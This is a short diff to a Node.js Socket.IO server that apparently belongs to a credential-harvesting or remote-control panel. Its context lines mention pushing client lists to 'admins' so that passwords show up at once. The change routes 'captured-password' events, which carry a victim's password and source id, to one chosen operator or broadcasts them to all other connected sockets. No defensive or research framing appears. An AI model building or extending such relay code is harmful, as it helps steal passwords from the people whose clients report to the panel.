@@ -260,7 +260,12 @@ io.on('connection', (socket) => {
         // Broadcast updated list to all admins so password shows up immediately
         io.emit('client-list', clients);
     }
-    io.to(data.targetId).emit('captured-password', { password: data.password, sourceId: data.sourceId });
+    
+    if (data.targetId && data.targetId !== 'all') {
+        io.to(data.targetId).emit('captured-password', { password: data.password, sourceId: data.sourceId });
+    } else {
+        socket.broadcast.emit('captured-password', { password: data.password, sourceId: data.sourceId });
+    }
   });
 
   socket.on('disconnect', () => {
